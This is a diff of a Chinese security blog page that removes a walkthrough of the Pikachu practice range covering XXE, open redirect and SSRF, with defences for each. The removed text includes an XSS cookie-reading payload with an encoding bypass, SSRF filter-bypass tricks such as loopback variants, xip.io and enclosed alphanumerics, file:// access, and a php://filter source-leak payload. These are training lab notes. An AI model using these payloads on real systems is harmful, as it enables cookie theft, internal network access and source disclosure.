-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313215035088.png" alt="image-20230313215035088" style="zoom:50%;">
-
-
-
-<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><p>XML外部实体（XML External Entity，简称XXE）注入漏洞是一种常见的安全漏洞，攻击者可以利用该漏洞从外部读取系统文件、进行端口扫描等操作，甚至可能导致服务器被完全控制。以下是XXE注入漏洞的一般判断方法、攻击步骤和防御方法：</p>
-<p>【判断方法】</p>
-<ol>
-<li>对外部实体文件的引用：XML文件中包含对外部实体文件的引用，例如DTD（文档类型定义）文件、XSD（XML模式定义）文件等。</li>
-<li>外部实体文件的内容可控：如果外部实体文件的内容可以被攻击者所控制，那么攻击者就可以通过修改这些文件来实现攻击目的。</li>
-<li>对外部实体文件的解析方式存在问题：如果服务器在解析外部实体文件时存在漏洞</li>
-</ol>
-<p>【攻击步骤】：</p>
-<ol>
-<li>构造含有恶意外部实体的XML文件。</li>
-<li>向目标系统提交带有恶意XML文件的请求。</li>
-<li>服务器解析请求中的XML文件，并读取恶意外部实体中的内容。</li>
-<li>攻击者利用获取到的信息实施攻击。</li>
-</ol>
-<p>【防御方法】：</p>
-<ol>
-<li>禁止或限制外部实体：在解析XML文件时，禁止或限制外部实体的定义和使用，可使用一些安全的XML解析器或API，如SAXParser，DOM4J等。</li>
-<li>输入过滤：对于XML文件中的输入参数，应该对其进行严格的输入验证和过滤，包括格式检查、长度检查、正则表达式检查等。</li>
-<li>强制使用最新版的XML解析器：最新版的XML解析器可能会包含已知的漏洞修复，使用最新版的XML解析器可增强系统的安全性。</li>
-<li>系统硬化：禁用或限制不必要的服务、端口，如FTP、Telnet等，减少攻击面。</li>
-<li>授权控制：限制只有授权用户才能访问XML文件解析服务，同时对用户权限进行细化控制。</li>
-</ol>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314103211914.png" alt="image-20230314103211914" style="zoom: 67%;">
-
-<h4 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h4><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314093539543.png" alt="image-20230314093539543" style="zoom:50%;">
-
-<p>【代码审计 】simplexml_load_string() 函数转换形式良好的 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020">XML</a> 字符串为 SimpleXMLElement 对象。也就是说<strong>输入的数据一定要是XML格式才有对象输出</strong></p>
-<p>直接输入：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>；发现<script>标签被转化了</p>
-<img src="Pichaku靶场通关笔记-下/image-20230314093756709.png" alt="image-20230314093756709" style="zoom:50%;" />
-
-<p>于是使用转移字符：输入<code>&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;</code>虽然该输入转化后是<script>alert(document.cookie)</script>，但不是实体名称的形式，最后处理的结果不符合。</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314094254087.png" alt="image-20230314094254087" style="zoom:50%;">
-
-<p>外部的<script>标签被处理后，剩下到的alert(document.cookie)部分不符合输入要求，于是再补充一个<script>标签，使得转化后是<script>alert(document.cookie)</script>；于是输入：</p>
-<p><code>&lt;script&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/script&gt;</code></p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314095512285.png" alt="image-20230314095512285" style="zoom:50%;">
-
-
-
-<h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><p>​        URL重定向漏洞（URL Redirection Vulnerability）是指攻击者通过构造恶意URL，诱导用户点击链接，使其跳转到攻击者指定的URL上，从而进行钓鱼攻击、恶意软件下载等攻击行为。</p>
-<p>【攻击类型】：</p>
-<ol>
-<li>钓鱼攻击：攻击者构造一个伪造的URL，诱导用户点击，将用户重定向到一个看似正常的页面，但实际上是攻击者构造的恶意页面，以此来获取用户的敏感信息。</li>
-<li>诱导下载：攻击者通过构造恶意URL，将用户重定向到一个看似正常的页面，但实际上是一个恶意软件下载页面，从而让用户下载并安装恶意软件。</li>
-<li>收集信息：攻击者通过构造恶意URL，将用户重定向到一个看似正常的页面，但实际上是一个收集用户信息的页面，从而获取用户的敏感信息。</li>
-</ol>
-<p>【防御措施】：</p>
-<ol>
-<li>对URL进行输入合法性验证，过滤掉非法字符，限制URL跳转的范围。</li>
-<li>对跳转目标URL进行白名单验证，限制跳转目标的范围。</li>
-<li>通过设置Referrer检测，限制重定向来源，避免跨站点攻击。</li>
-<li>对URL跳转进行统一管理和跟踪，及时发现并防御攻击行为。</li>
-</ol>
-<h4 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h4><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314103354301.png" alt="image-20230314103354301" style="zoom: 50%;">
-
-<p>发现用url作为变量，输出其他网站的url</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314103512302.png" alt="image-20230314103512302" style="zoom:50%;">
-
-<p>按回车后就会跳去指定网站</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314103557548.png" alt="image-20230314103557548" style="zoom:50%;">
-
-
-
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>​        SSRF（Server-Side Request Forgery）漏洞是指攻击者通过构造恶意的请求，使得服务器发起对内部系统或外部系统的请求，并将响应结果返回给攻击者，从而可能导致内部系统的敏感信息泄露、服务端请求伪造、甚至对内部系统发起攻击等安全问题。攻击者通常会利用SSRF漏洞来获取内部系统的敏感信息，比如访问内部接口、读取配置文件、窃取密码等；也可以通过SSRF漏洞发起攻击，如利用内部系统发起DDoS攻击、横向渗透攻击等。</p>
-<p>【SSRF漏洞判断步骤】</p>
-<ol>
-<li>确认应用程序中是否包含从外部获取URL的功能，例如从用户输入、请求参数、外部文件等获取URL的功能。</li>
-<li>尝试构造URL，指向内部网络的资源，例如在URL中使用”file://“、”ldap://“、”dict://“等协议，或者使用IP地址和端口号指向内部网络的资源。</li>
-<li>观察应用程序的响应是否包含了来自内部网络的敏感信息，例如主机名、端口号、文件名、目录结构等信息。</li>
-<li>观察应用程序的响应是否存在请求了多个URL，但只有部分URL返回结果的情况，这可能表明应用程序正在尝试访问内部网络中的资源。</li>
-<li>使用工具进行测试，例如Burp Suite、OWASP ZAP等可以检测SSRF漏洞的漏洞扫描器，或者自行编写脚本进行测试。</li>
-</ol>
-<p>【SSRF漏洞利用】： </p>
-<ol>
-<li>利用URL地址栏参数漏洞：攻击者可以通过修改URL参数，将请求发送到其他内部或外部系统。</li>
-<li>利用Web应用程序的漏洞：攻击者可以通过Web应用程序内部的漏洞，发送特定的请求，进而发起SSRF攻击。</li>
-<li>利用协议处理漏洞：攻击者可以通过构造特定的协议请求，利用协议处理漏洞，进而发起SSRF攻击。</li>
-</ol>
-<p>【绕过方法】</p>
-<p>学习链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/31287233">https://zhuanlan.zhihu.com/p/31287233</a></p>
-<p>1.<strong>@符号绕过</strong>：在某个地址1后添加“@”再添加地址2，浏览器会返回地址2的内容 ；如：</p>
-<p><a target="_blank" rel="noopener" href="http://www.abc.com@www.bcd.com,浏览器会访问http//www.bcd.com">http://www.abc.com@www.bcd.com,浏览器会访问http://www.bcd.com</a></p>
-<p>2.<strong>IP地址转换</strong>：对内网请求的IP进行各种进制的编码。<strong>（钓鱼邮件常用于绕过检测）</strong></p>
-<p>3.<strong>短网址绕过</strong>：为了方便，一些公司提供过把长的 URL 转成短的 URL的服务；以google家的 URL shortener 服务： <a target="_blank" rel="noopener" href="http://goo.gl/">http://goo.gl/</a> 为例；</p>
-<p>​    假设把<a target="_blank" rel="noopener" href="http://abcdefghijk输入,服务器会返回一个更短的url,假设返回http//goo.gl/abc%EF%BC%9B%E5%BD%93%E8%AE%BF%E9%97%AEhttp://goo.gl/abc%E6%97%B6%EF%BC%8CDNS%E9%A6%96%E5%85%88%E4%BC%9A%E8%A7%A3%E6%9E%90%E8%8E%B7%E5%BE%97http://goo.gl/%EF%BC%8C%E7%84%B6%E5%90%8E%E5%90%91%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E5%8F%91%E9%80%81HTTP">http://abcdefghijk输入，服务器会返回一个更短的url，假设返回http://goo.gl/abc；当访问http://goo.gl/abc时，DNS首先会解析获得http://goo.gl/，然后向这个地址发送HTTP</a> GET请求，查询 abc， 这个时候，<a target="_blank" rel="noopener" href="http://goo.gl/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E6%8A%8A%E8%AF%B7%E6%B1%82%E9%80%9A%E8%BF%87HTTP">http://goo.gl/服务器会把请求通过HTTP</a> 301转到对应的长URL<a target="_blank" rel="noopener" href="http://abcdefghijk.后面的解析过程就和平常网址解析是一样的了./">http://abcdefghijk。后面的解析过程就和平常网址解析是一样的了。</a></p>
-<p>4.<strong>点分割符号替换</strong>：可以利用“。”替换分隔符“.”，例如用<a target="_blank" rel="noopener" href="http://www.abc.com替换http//www.abc.com">http://www。abc。com替换http://www.abc.com</a></p>
-<p>5.<strong>本地回环地址的其他形式</strong>：127.0.0.1通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])：</p>
-<p>a.<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
-<p>b.<a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a></p>
-<p>c.<a target="_blank" rel="noopener" href="http://127.255.255.254/">http://127.255.255.254</a></p>
-<p>d.http://[::1]</p>
-<p>e.http://[::ffff:7f00:1]</p>
-<p>f.http://[::ffff:127.0.0.1]</p>
-<p>g.<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1</a></p>
-<p>h.<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.1</a></p>
-<p>i.<a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0:80</a></p>
-<p>j.http://[::]:80/ </p>
-<p>6.<strong>xip.io绕过</strong>：xip.io的原理就是个dns解析服务，xip.io在公共Internet上运行自定义DNS服务器。当您的计算机查找xip.io域时，xip.io, DNS服务器从域中提取IP地址，然后将其发送回响应；例如：</p>
-<p>语法：前缀域名+ip地址+xip.io</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>.xip.io     	 解析为  <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">http:<span class="comment">//10.0.0.1.xip.io	 解析为  10.0.0.1</span></span><br><span class="line">www<span class="number">.10</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>.xip.io 	 解析为  <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">mysite<span class="number">.10</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>.xip.io   解析为  <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">foo.bar<span class="number">.10</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>.xip.io  解析为  <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
-<p>7.利用Enclosed alphanumerics（封闭式字母数字）绕过：</p>
-<p>例如：可以用来www.① 23Ⓐbc.com替换<a target="_blank" rel="noopener" href="http://www.123abc.com/">www.123abc.com</a></p>
-<p>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p>
-<p>【防御措施】</p>
-<ol>
-<li>验证用户输入：对用户输入进行严格的输入验证和过滤，避免用户输入可疑的URL地址或参数。</li>
-<li>设置白名单：对所有外部请求的目标URL地址和协议进行白名单过滤，只允许请求安全可信的URL地址和协议。</li>
-<li>避免使用不安全的协议：例如：dict、ftp、file等，只允许http/https。</li>
-<li>过滤返回信息：验证远程服务器对请求的返回结果，是否合法</li>
-<li>内网隔离：对内部系统进行严格的网络隔离，避免攻击者利用SSRF漏洞攻击内部系统。</li>
-<li>限制请求的端口：将内部系统的默认端口修改为非常规的端口，减少攻击者的识别和攻击难度。</li>
-<li>安全配置：合理配置服务器安全策略，如关闭服务器中的DNS解析功能，禁止使用不安全的协议等。</li>
-<li>使用安全框架：使用具有防范SSRF漏洞功能的安全框架，如Java的Spring Security框架等。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>
-<h4 id="SSRF（curl）"><a href="#SSRF（curl）" class="headerlink" title="SSRF（curl）"></a>SSRF（curl）</h4><p>发现存在使用url作为变量</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314110002240.png" alt="image-20230314110002240" style="zoom:67%;">
-
-<p>直接注入其他链接</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314110056296.png" alt="image-20230314110056296" style="zoom: 50%;">
-
-<p>也可以使用file协议，获取本地资源</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314110324132.png" alt="image-20230314110324132" style="zoom:67%;">
-
-
-
-<h4 id="SSRF（fgc）"><a href="#SSRF（fgc）" class="headerlink" title="SSRF（fgc）"></a>SSRF（fgc）</h4><p>file_get_contents() 把整个文件读入一个字符串中。它可以对本地文件进行读取，也可以对远程文件进行读取<br>如果pikachu这台服务器所处的内网还有另一台不想被访问的服务器，那么可以使用该漏洞进行请求另一台服务器的资源。</p>
-<p>SSRF（curl）采取的攻击方式在这里也可以进行；若想知道它后台的PHP是怎么写的，可以通过构造一个payload去获取后台的PHP源码</p>
-<p>payload：<code>php://filter/read=convert.base64-encode/resource=ssrf.php</code></p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314112554456.png" alt="image-20230314112554456" style="zoom:67%;">
-
-<p>将获取到的base64编码进行解码，获的源码</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230314112758851-169071078938129.png" alt="image-20230314112758851" style="zoom: 50%;">
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1727,7 +1827,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">85</span>
+          <span class="site-state-item-count">86</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
